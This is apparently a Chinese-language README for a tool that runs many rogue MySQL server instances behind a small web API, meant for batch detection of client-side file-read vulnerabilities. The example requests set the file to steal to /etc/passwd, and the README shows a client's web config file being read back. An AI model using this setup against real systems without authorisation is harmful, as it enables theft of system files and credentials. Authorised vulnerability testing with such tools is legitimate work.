# 介绍

对于需要使用 Rogue Mysql Server 的漏洞来说，若想批量检测这种漏洞的话需要自备一个服务器。并且我常用的[Rogue Mysql Server 脚本](https://github.com/allyshka/Rogue-MySql-Server) 不支持动态更改读取文件名、不支持远程用户访问读取结果、不支持批量化检测网站。于是乎萌生了这个小脚本的想法

</br>

**Rogue-MySql-Web-Server** 有两个重要文件：`server.py` 和 `rogue_mysql_server.py`。其中 `server.py` 是主脚本，用于起一个简陋的Web服务以及远程用户交互；`rogue_mysql_server.py` 是魔改了 [Rogue Mysql Server 脚本](https://github.com/allyshka/Rogue-MySql-Server) 的产物。支持通过传参的方式来起 Rogue Mysql Server。

</br>

# 功能

**Rogue-MySql-Web-Server** 的主要功能为：使授权远程用户可通过参数拉起指定配置的 Rogue Mysql Server、获取Mysql客户端被读取文件内容。为了能够实现这些功能，Rogue-MySql-Web-Server 的基本结构如下：

1. 鉴权，仅允许密码正确的用户访问资源，密码不正确 或 url格式不正确者 直接**断开连接**。
2. 根据远程用户传参确定 **Code**（相当于唯一id），拉起一个 Rogue Mysql Server 实例，存入 Server池中
3. 每个新的 Rogue Mysql Server 实例都监听着不同的端口，以保证同时测试多个网站时不会冲突
4. 若有需要，可通过远程用户传参**销毁**指定 **Code** 的 Rogue Mysql Server 实例
5. Rogue-MySql-Web-Server 会根据远程用户传入 **Code** 获取**对应** Rogue Mysql Server 的读取结果

</br>

**项目结构如下：**

<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/1.png"/>



# 使用

**环境：**

**python 2.7 & python 3.x**

*ps:python2 和 python3 都要有。。。因为 `rogue_mysql_server.py` 是魔改别人的脚本，，懒得改成 python3了，，一般装 Linux 都会预装 python2 和 python3 的吧。。。。。*

</br>

**配置**：

需要修改的地方主要有四处：

1. `password` --- 连接密码
2. `port` --- Web服务监听端口
3. `pythonPath` --- 服务器中 python 2 可执行文件路径
4. `for p in range(2000,3000)` --- Rogue Mysql Server 实例的端口范围。指定多少端口就决定了能拉起多少个 Rogue Mysql Server实例。最好配置成没有任何一个端口占用的范围

默认值如下：

<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/3.png"/>

</br>

**运行：**

配置完毕后，使用命令 `python3 server.py` 运行主程序。这样就是跑起来了

<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/2.png"/>

注意一定要用 python 3.x 版本来运行主程序，建议使用 python 3.7。若使用 python 2 会有 Subprocess 和 Socket 连用 Socket 返回特别慢的bug。

</br>

## 访问格式

由于主程序实现了一个简陋的Web服务，所以我使用 **url的格式** 来给程序传参。格式如下：

`/password/operation/code/sqlRandomString?x=file`

<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/4.png"/>

不管是什么操作都必须按照这个格式来发送，不然无法正常与程序交互

</br>

## 新建Rogue Mysql Server 实例

在开始测试 Rogue Mysql Server 漏洞前，需要先从 Rogue-MySql-Web-Server 上获取一个 Rogue Mysql Server 实例。使用如下请求可让 Rogue-MySql-Web-Server 生成一个 Rogue Mysql Server 实例 并返回相关信息：

```shell
##Request:##
GET /ebf734024jto485/instantiate/202cb962ac59075b964b07152d234b70-1622045270467/x1x2x3x4?x=/etc/passwd HTTP/1.1

Host: 127.0.0.1:1921

##Response:##
HTTP/1.1 200 ok
Content-Type: application/json

{"code": "1", "msg": "2000"}
```



<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/5.png"/>

Request：

1.  `operation` 设置为 **instantiate**
2. `password` 需要和 `server.py` 中定义的一致
3. `code` 需要客户端自行生成。推荐格式：`随机数的md5-微秒级时间戳`。这是为每个 Rogue Mysql Server实例分配的 id
4. `sqlRandomString` 虽然在这阶段没用，但**仍然需要发送**
5. `file` 用于配置 Rogue Mysql Server，指定要读取的客户端文件路径。**只能设置一个文件，不支持多个**

Response:

1. Rogue-MySql-Web-Server 将以 json 形式返回数据。字段只有两个：`code` 和 `msg`
2. `code` 为  1 代表实例化成功，为 0 代表实例化失败
3. `msg` 为该 Rogue Mysql Server实例监听的端口

</br>

## 读取 Rogue Mysql Server 结果

被攻击的客户端执行的 SQL Query 是有讲究的， SQL Query 中需要包含 `code`+`sqlRandomString` 以便 Rogue-MySql-Web-Server 筛选文件内容。推荐格式如下：

`select/update/delete ..... where x='{code}{sqlRandomString}'`

`insert into x values('{code}{sqlRandomString}')`

**其中：**

`{code}`  为 “新建 Rogue Mysql Server实例” 时传的 `code` 参数。

`{sqlRandomString}`  为  “新建 Rogue Mysql Server实例” 时传的 `sqlRandomString` 参数。

</br>

**模拟场景**：客户端连接 Rogue Mysql Server:

<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/6.png"/>

其中 **连接端口** 为 “新建 Rogue Mysql Server实例” 请求中响应的 `msg` 字段，并且Sql语句中需要存在 `code+sqlRandomString` 的字符串。

客户端成功连接 Rogue Mysql Server 后，我们便可获取客户端读取的文件内容了。请求如下：

```shell
##Request:##
GET /ebf734024jto485/readInfo/202cb962ac59075b964b07152d234b70-1622045270467/x1x2x3x4?x=/etc/passwd HTTP/1.1

Host: 127.0.0.1:1921


##Response:##
HTTP/1.1 200 ok
Content-Type: application/json

{"code": "1", "msg": "'xxxxx"}
```

<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/7.png"/>

**Request：**

1.  `operation` 设置为 **readInfo**
2. `password` 需要和 `server.py` 中定义的一致
3. `code` 需要客户端自行生成。推荐格式：`随机数的md5-微秒级时间戳`。用于指定读取哪个 Rogue Mysql Server 的内容
4. `sqlRandomString` 用于区分同一个 Rogue Mysql Server 内容中，不同时间段读取的文件内容。会在下文详细说
5. `file` 虽然在这阶段没用，但**仍然需要发送**

**Response:**

1. Rogue-MySql-Web-Server 将以 json 形式返回数据。字段只有两个：`code` 和 `msg`
2. `code` 为  1 代表通过 `code`+`sqlRandomString` 成功匹配到文件内容，为 0 代表没用匹配到文件内容
3. 当 `code` 为 1 时，`msg` 仅为匹配到的文件内容；当 `code` 为 2 时， `msg` 代表全部文件内容；当 `code` 为 0 时， `msg` 代表 读取文件时有异常

</br>

`sqlRandomString` 用于区分同一个 Rogue Mysql Server 内容中，不同时间段读取的文件内容。如下所示：

首先，客户端执行了如下 SQL query，`code` 为 202cb962ac59075b964b07152d234b70-1622045270468，`sqlRandomString` 为 a1a2a3

`select 1 where x='202cb962ac59075b964b07152d234b70-1622045270468a1a2a3';`

构造读取文件请求，如下，成功获取到客户端 `/var/www/html/config.txt` 文件内容

<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/9.png"/>

</br>

假设此时 `/var/www/html/config.txt`  文件内容发生了变化，想要获取最新的文件内容，需要修改 SQL query 中的 `sqlRandomString`  并让客户端再执行一次。下面Demo修改 `sqlRandomString` 为 b1b2b3

`select 1 where x='202cb962ac59075b964b07152d234b70-1622045270468b1b2b3';`

构造读取文件请求，修改 `sqlRandomString` 使之与 SQL query 对应。如下，成功获取到客户端 `/var/www/html/config.txt` 文件新内容

<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/10.png"/>

</br>

若 `code`+`sqlRandomString` 无法匹配到文件内容，将会返回整个文件内容，并且 `code` 为 2：

<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/8.png"/>

</br>

## 销毁Rogue Mysql Server 实例

当成功读取完客户端文件不需要再使用 Rogue Mysql  Server时，可以将其销毁，避免占用系统资源。使用如下请求可销毁对应 code 的 Rogue Mysql Server实例：

```shell
##Request:##
GET /ebf734024jto485/destroy/202cb962ac59075b964b07152d234b70-1622045270467/x1x2x3?x=/etc/passwd HTTP/1.1

Host: 127.0.0.1:1921


##Response:##
HTTP/1.1 200 ok
Content-Type: application/json

{"code": "1", "msg": "destroied"}
```

<img src="https://github.com/xiaopan233/Rogue-MySql-Web-Server/blob/main/img/12.png"/>

**Request：**

1.  `operation` 设置为 **destroy**
2. `password` 需要和 `server.py` 中定义的一致
3. `code` 需要客户端自行生成。推荐格式：`随机数的md5-微秒级时间戳`。用于指定销毁哪个 Rogue Mysql Server
4. `sqlRandomString` 虽然在这阶段没用，但**仍然需要发送**
5. `file` 虽然在这阶段没用，但**仍然需要发送**

**Response:**

1. Rogue-MySql-Web-Server 将以 json 形式返回数据。字段只有两个：`code` 和 `msg`
2. `code` 为  1 代表销毁成功



# Reference

https://github.com/allyshka/Rogue-MySql-Server
